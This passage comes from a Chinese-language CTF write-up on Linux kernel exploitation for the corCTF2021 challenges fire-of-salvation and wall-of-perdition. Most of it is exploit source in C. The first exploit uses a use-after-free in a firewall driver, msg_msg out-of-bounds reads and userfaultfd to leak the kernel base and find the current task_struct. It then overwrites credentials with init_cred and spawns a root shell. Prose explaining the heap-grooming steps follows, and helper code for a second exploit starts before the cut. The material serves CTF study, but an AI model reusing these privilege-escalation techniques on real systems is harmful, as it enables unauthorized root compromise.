  &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule.proto, &amp;buf[<span class="number">0x28</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule.port, &amp;buf[<span class="number">0x2a</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule.action, &amp;buf[<span class="number">0x2c</span>], <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0x1337BEEF</span>, &amp;rule);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[DATALEN_MSG + <span class="number">0x20</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; msgbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> fake_msg[<span class="number">0x2000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF81C33060</span>;</span><br><span class="line"><span class="type">size_t</span> init_task = <span class="number">0xFFFFFFFF81C124C0</span>;</span><br><span class="line"><span class="type">size_t</span> cur_task;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASKS_OFFSET 0x298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PID_OFFSET 0x398</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_OFFSET 0x540</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, DATALEN_MSG + <span class="number">0x10</span>, cur_task + CRED_OFFSET - <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">        edit_rule(<span class="number">1</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">char</span> *page_buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memset</span>(page_buf, <span class="number">0</span>, PAGE_SIZE * <span class="number">2</span>);</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;page_buf[DATALEN_MSG] = init_cred;</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;page_buf[DATALEN_MSG + <span class="number">8</span>] = init_cred;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(<span class="number">0xFFF</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = PAGE_SIZE * <span class="number">2</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    firewall_fd = open(<span class="string">&quot;/dev/firewall&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (firewall_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to open firewall.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add_rule(<span class="number">0</span>, INBOUND);</span><br><span class="line">    dup_rule(<span class="number">0</span>, INBOUND);</span><br><span class="line">    delete_rule(<span class="number">0</span>, INBOUND);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> msqid0 = get_msg_queue();</span><br><span class="line">    <span class="built_in">memset</span>(msgbuf.mtext, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(msgbuf.mtext));</span><br><span class="line">    write_msg(msqid0, &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x500</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] shmget failed.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> *shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] shmat failed.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">114514</span>, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;oob_msgbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msgbuf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: %p\n&quot;</span>, peek_msg(msqid0, &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak kernel addr from shm_file_data&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_offset = search_kernel_offset(&amp;oob_msgbuf.mtext[DATALEN_MSG], DATALEN_SEG);</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to find kernel offset.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    init_task += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_cred addr: %#lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_task addr: %#lx\n&quot;</span>, init_task);</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1919810</span>, DATALEN_MSG + DATALEN_SEG, init_task + TASKS_OFFSET - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;oob_msgbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msgbuf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: %p\n&quot;</span>, peek_msg(msqid0, &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak root cred addr from init_task&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], <span class="number">0x2b0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> prev = *(<span class="type">uint64_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG + <span class="number">8</span>];</span><br><span class="line">    <span class="type">uint32_t</span> pid = *(<span class="type">uint32_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG - TASKS_OFFSET + PID_OFFSET];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_task-&gt;tasks.prev: %#lx\n&quot;</span>, prev);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_task-&gt;pid: %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] current pid: %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    cur_task = init_task;</span><br><span class="line">    <span class="keyword">while</span> (pid != getpid()) &#123;</span><br><span class="line">        build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">114514</span>, DATALEN_MSG + DATALEN_SEG, prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">        edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: %p\n&quot;</span>, peek_msg(msqid0, &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">        qword_dump(<span class="string">&quot;find task_struct&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], <span class="number">0x2b0</span>);</span><br><span class="line">        cur_task = prev - TASKS_OFFSET;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] task_struct addr: %p\n&quot;</span>, cur_task);</span><br><span class="line">        prev = *(<span class="type">uint64_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG + <span class="number">8</span>];</span><br><span class="line">        pid = *(<span class="type">uint32_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG - TASKS_OFFSET + PID_OFFSET];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] task_struct-&gt;tasks.prev: %#lx\n&quot;</span>, prev);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] task_struct-&gt;pid: %d\n&quot;</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] find current task_struct addr: %p\n&quot;</span>, cur_task);</span><br><span class="line"></span><br><span class="line">    add_rule(<span class="number">1</span>, INBOUND);</span><br><span class="line">    dup_rule(<span class="number">1</span>, INBOUND);</span><br><span class="line">    delete_rule(<span class="number">1</span>, INBOUND);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *uffd_page = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">3</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(uffd_page, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">    register_userfaultfd(uffd_page + PAGE_SIZE, PAGE_SIZE * <span class="number">2</span>, handler_thread);</span><br><span class="line">    <span class="type">int</span> msqid1 = get_msg_queue();</span><br><span class="line">    write_msg(msqid1, uffd_page + PAGE_SIZE - <span class="number">8</span>, DATALEN_MSG + <span class="number">0x10</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, DATALEN_MSG + DATALEN_SEG, cur_task + TASKS_OFFSET - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;oob_msgbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msgbuf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: %p\n&quot;</span>, peek_msg(msqid0, &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;debug current task cred&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], <span class="number">0x2b0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="例题corctf2021-wall-of-perdition">例题：corCTF2021
wall-of-perdition</h4>
<p>这道题是 corCTF2021 fire-of-salvation 的加强版，主要区别是 UAF 的
object 不在是 kmalloc-4k 而是 kmalloc-64
。因此这道题不能像上一题那样直接通过 userfaultfd + UAF 修改
<code>next</code> 实现任意地址写。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint32_t</span> ip;</span><br><span class="line">    <span class="type">uint32_t</span> netmask;</span><br><span class="line">    <span class="type">uint16_t</span> proto;</span><br><span class="line">    <span class="type">uint16_t</span> port;</span><br><span class="line">    <span class="type">uint8_t</span> action;</span><br><span class="line">    <span class="type">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="type">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="type">rule_t</span>;</span><br></pre></td></tr></table></figure></div>
不过我们可以通过堆风水使得一个 <code>kmalloc-4k</code> 的
<code>msg_msg</code> 的 <code>next</code> 指向另一个
<code>kmalloc-4k</code> 的 <code>msg_msg</code> 利用两个 userfaultfd
依次进行 <code>next</code> 和任意地址写。具体流程如下。
首先按下图所示构造两个 <code>msg_queue</code> 并添加
<code>msg_msg</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/24e94962517b4f0681d5fd1396aa96c0.png"
                     
alt="在这里插入图片描述" 
                > 通过 UAF 修改 <code>m_ts</code>
越界读泄露内核基址以及 <code>msg_msg</code> 地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/99231c1096fdcb431606d8b2e560edea.png"
                     
alt="在这里插入图片描述" 
                > 参照上一题的方法找到本进程
<code>task_struct</code> 的地址。</p>
<p>之后释放第二个 <code>msg_queue</code> 中的那个
<code>msg_msg + msg_msgseg</code> 结构。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1ba4501cdc8cbdf4c65103251218c3af.png"
                     
alt="在这里插入图片描述" 
                > 由于 SLAB 类似 fast bin
的堆管理机制，再次创建 <code>msg_msg + msg_msgseg</code> 结构时
<code>msg_msg</code> 和 <code>msg_msgseg</code> 对应的两个 object
互换。也就是说之前泄露的 <code>msg_msg</code> 地址现在对应的是
<code>msg_msgseg</code> 。</p>
<p>在再次创建 <code>msg_msg + msg_msgseg</code> 结构时我们用 userfaultfd
将其卡住。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1189f35875ab7f1e930e603b7ca0c2e4.png"
                     
alt="在这里插入图片描述" 
                > 之后 UAF 修改 <code>msg_msg</code> 的
<code>next</code> 指向之前泄露的 <code>msg_msg</code> 也就是新添加的
<code>msg_msgseg</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/80fb97d67df68ca0f3ed8dbfbf510967.png"
                     
alt="在这里插入图片描述" 
                > 释放刚才 UAF 的 <code>msg_msg</code> 从而将
<code>msg_msgseg</code>也一起释放了。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7b552dbd55e24b3d76c3cc58ce644bef.png"
                     
alt="在这里插入图片描述" 
                > 之后再次添加一个
<code>msg_msg + msg_msgseg</code> 结构，并同样用 userfaultfd
卡住。至此已经完成了一个 <code>kmalloc-4k</code> 的 <code>msg_msg</code>
的 <code>next</code> 指向另一个 <code>kmalloc-4k</code> 的
<code>msg_msg</code> 的结构的构造。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ae94ca3d7acd9c6cd85dfe806baf3749.png"
                     
alt="在这里插入图片描述" 
                > 利用两个 userfaultfd 可以完成任意地址写。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/46c57e799b11b9132f59badef7c210d8.png"
                     
alt="在这里插入图片描述" 
                ><img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1acd35989a9c0970d4aa1b265e55ca09.png"
                     
alt="在这里插入图片描述" 
                > <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_KERNEL_OFFSET 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> kernel_addr_list[] = &#123;</span><br><span class="line">        <span class="number">0xffffffff81c41600</span>,</span><br><span class="line">        <span class="number">0xffffffff81a159a0</span>,</span><br><span class="line">        <span class="number">0xffffffff81802f90</span>,</span><br><span class="line">        <span class="number">0xffffffff81802f80</span>,</span><br><span class="line">        <span class="number">0xffffffff814c1659</span>,</span><br><span class="line">        <span class="number">0xffffffff81b2de35</span>,</span><br><span class="line">        <span class="number">0xffffffff81b2de2a</span>,</span><br><span class="line">        <span class="number">0xffffffff81c4d961</span>,</span><br><span class="line">        <span class="number">0xffffffff81b2c42d</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernel_offset_query</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_kernel_text_addr(kernel_text_leak)) &#123;</span><br><span class="line">        <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kernel_addr_list) / <span class="keyword">sizeof</span>(kernel_addr_list[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!((kernel_text_leak ^ kernel_addr_list[i]) &amp; <span class="number">0xFFF</span>) &amp;&amp; (kernel_text_leak - kernel_addr_list[i]) % <span class="number">0x100000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> kernel_text_leak - kernel_addr_list[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] unknown kernel addr: %#lx\n&quot;</span>, kernel_text_leak);</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">search_kernel_offset</span><span class="params">(<span class="type">void</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> *search_buf = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> kernel_offset = kernel_offset_query(search_buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel leak addr: %#lx\n&quot;</span>, search_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %#lx\n&quot;</span>, kernel_offset);</span><br><span class="line">            <span class="keyword">return</span> kernel_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span 